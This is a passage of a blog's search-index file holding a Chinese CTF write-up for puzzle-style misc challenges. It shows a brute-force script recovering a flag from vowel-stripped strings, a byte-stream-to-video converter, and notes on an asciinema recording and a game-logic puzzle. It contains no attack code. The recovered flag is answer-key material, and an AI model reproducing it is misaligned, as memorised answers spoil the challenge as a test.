class="line">strs1.append(&#x27;nymeh1niwemflcir&#125;echaete&#x27;)</span><br><span class="line">print(strs1)</span><br><span class="line"></span><br><span class="line">my_str2 = &#x27;a3g7&#125;kidgojernoetlsup?h&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs2 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str2:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str2[:index] + s + my_str2[index:]</span><br><span class="line">        strs2.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs2.append(&#x27;a3g7&#125;kidgojernoetlsup?he&#x27;)</span><br><span class="line">strs2.append(&#x27;a3g7&#125;kidgojernoetlsupe?h&#x27;)</span><br><span class="line">print(strs2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_str3 = &#x27;ulw!f5soadrhwnrsnstnoeq&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs3 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str3:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str3[:index] + s + my_str3[index:]</span><br><span class="line">        strs3.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs3.append(&#x27;ulwe!f5soadrhwnrsnstnoeq&#x27;)</span><br><span class="line">strs3.append(&#x27;ulw!f5soadrhwnrsnstnoeqe&#x27;)</span><br><span class="line">print(strs3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_str4 = &#x27;ct&#123;l-findiehaai&#123;oveatas&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs4 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str4:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str4[:index] + s + my_str4[index:]</span><br><span class="line">        strs4.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs4.append(&#x27;cte&#123;l-findiehaai&#123;oveatas&#x27;)</span><br><span class="line">strs4.append(&#x27;ct&#123;le-findiehaai&#123;oveatas&#x27;)</span><br><span class="line">strs4.append(&#x27;ct&#123;l-findiehaai&#123;oveatase&#x27;)</span><br><span class="line">print(strs4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_str5 = &#x27;ty9kxborszstguyd?!blm-p&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs5 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str5:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str5[:index] + s + my_str5[index:]</span><br><span class="line">        strs5.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs5.append(&#x27;tye9kxborszstguyd?!blm-p&#x27;)</span><br><span class="line">strs5.append(&#x27;ty9kxborszstguyde?!blm-p&#x27;)</span><br><span class="line">strs5.append(&#x27;ty9kxborszstguyd?!blme-p&#x27;)</span><br><span class="line">strs5.append(&#x27;ty9kxborszstguyd?!blm-pe&#x27;)</span><br><span class="line">print(strs5)</span><br><span class="line">print(len(strs5))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>暴力即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line"># Th siz of th fil may reduc after XZRJification</span><br><span class="line"></span><br><span class="line">def check_equals(flag,left, right):</span><br><span class="line">    # check whether left == right or not</span><br><span class="line">    if left == right: print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_data(input_codes):</span><br><span class="line">    # retriev th decrypted data</span><br><span class="line"></span><br><span class="line">    output_chars = [cod_dict[c] for c in input_codes]</span><br><span class="line">    return &#x27;&#x27;.join(output_chars)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # check som obvious things</span><br><span class="line">    # check th flag</span><br><span class="line">    flags = []</span><br><span class="line">    for i in range(len(strs1)):</span><br><span class="line">        for j in range(len(strs2)):</span><br><span class="line">            for k in range(len(strs3)):</span><br><span class="line">                for d in range(len(strs4)):</span><br><span class="line">                    for m in range(len(strs5)):</span><br><span class="line">                        cod_dict = []</span><br><span class="line">                        cod_dict += strs1[i]</span><br><span class="line">                        cod_dict += strs2[j]</span><br><span class="line">                        cod_dict += strs3[k]</span><br><span class="line">                        cod_dict += strs4[d]</span><br><span class="line">                        cod_dict += strs5[m] </span><br><span class="line">                        tttttt = [53, 41, 85, 109, 75, 1, 33, 48, 77, 90,</span><br><span class="line">                                            17, 118, 36, 25, 13, 89, 90, 3, 63, 25,</span><br><span class="line">                                            31, 77, 27, 60, 3, 118, 24, 62, 54, 61,</span><br><span class="line">                                            25, 63, 77, 36, 5, 32, 60, 67, 113, 28]</span><br><span class="line">                        </span><br><span class="line">                        output_chars = [cod_dict[c] for c in tttttt]</span><br><span class="line">                        flag = &#x27;&#x27;.join(output_chars)</span><br><span class="line">                        </span><br><span class="line">                        if flag not in flags:</span><br><span class="line">                            if &#x27;flag&#123;&#x27; in flag and &#x27;&#125;&#x27; in flag:</span><br><span class="line">                                check_equals(flag,flag.index(&#x27;flag&#123;&#x27;), 0)</span><br><span class="line">                                check_equals(flag,flag.index(&#x27;&#125;&#x27;), len(flag) - 1)</span><br><span class="line">                                flags.append(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;nou-v&#125;-r3lovmr3d-7hm-an5w3r-rhght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3lovmr3d-7hm-an5w3r-rhght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3lover3d-7he-an5w3r-rhght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3lover3d-7he-an5w3r-r1ght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3cover3d-7he-an5w3r-r1ght?&#125;</span><br><span class="line">flag&#123;you-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</span><br><span class="line">flag&#123;you-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</span><br></pre></td></tr></table></figure><p>这里调后面的即可</p><h2 id="高频率星球"><a class="markdownIt-Anchor" href="#高频率星球">#</a> <strong>高频率星球</strong></h2><p>我还专门下载了 asciinema（只能再 linux 上使用），这题主要是解码 json 再删去记录的相应的操作字符即可，直接 python 提取 json 内容再转到 notepad++ 上替换操作字符串。</p><p>另外 windows 直接改后缀无法打开（菜我不知道为什么，还以为自己没替换好），必须在 linux 下 Node flag.js 才可。</p><h2 id="流式星球"><a class="markdownIt-Anchor" href="#流式星球">#</a> <strong>流式星球</strong></h2><p>这题先跟着视频如何转换为字节流的代码反向写一个字节流转换为视频的代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">def bin_to_video(bin_file, output_video, frame_width=1280, frame_height=640):</span><br><span class="line">   </span><br><span class="line">    buffer = np.fromfile(bin_file, dtype=np.uint8)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    frame_count = len(buffer) // (frame_width * frame_height * 3)</span><br><span class="line"></span><br><span class="line">    reshaped_buffer = buffer[:frame_count * frame_width * frame_height * 3]</span><br><span class="line">    reshaped_buffer = reshaped_buffer.reshape((frame_count, frame_height, frame_width, 3))</span><br><span class="line"></span><br><span class="line">    fourcc = cv2.VideoWriter_fourcc(*&#x27;mp4v&#x27;)</span><br><span class="line">    out = cv2.VideoWriter(output_video, fourcc, 30.0, (frame_width, frame_height))</span><br><span class="line"></span><br><span class="line">    for i in range(frame_count):</span><br><span class="line">        out.write(reshaped_buffer[i])</span><br><span class="line"></span><br><span class="line">    out.release()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    bin_to_video(&quot;video.bin&quot;, &quot;deo.mp4&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现能模糊的看到 BangDream 几个字，之后去 B 站搜索了下，并找到相应的原视频（原视频为 360*640，改了一下 frame_width 和 frame_height，发现视频更加模糊），自己用题目给出的转化代码转换原视频，再自己手动测试，发现规律，在 frame_width 正确的情况下，frame_height 如何改变，视频只会出详上下移动的效果，而 frame_width 错误则视频极有可能十分模糊。直接上暴力，暴力 frame_width 直到找到正确的答案。似乎是 346. 之后就能得到清晰的视频</p><h2 id="异星歧途"><a class="markdownIt-Anchor" href="#异星歧途">#</a> <strong>异星歧途</strong></h2><p>主要是了解游戏机制，观看游戏里逻辑控制器的指令。第一个二进制序列很简单，照着打就行。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/2.png?raw=true" alt="图片"><br>第二个指令需要进行运算，指令给出 sw1-8 组成了 number,number == fl0 时能够运行，fl0 只能为数的平方，且 SW1 = SW6 = 1，直接一步步试一下就行。 第三个指令序列需要看游戏机制，在满足反应堆冷却液充足的情况下打开传送带开关即可。第四个指令序列也要了解游戏机制中焚化炉的作用，合理关闭烧毁发电材料的焚化炉即可。（此游戏让我想到了异星工厂，另一款非常好的传送带工厂游戏）</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/11/10/hello-world/"/>
      <url>/2023/11/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>This is the start!</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
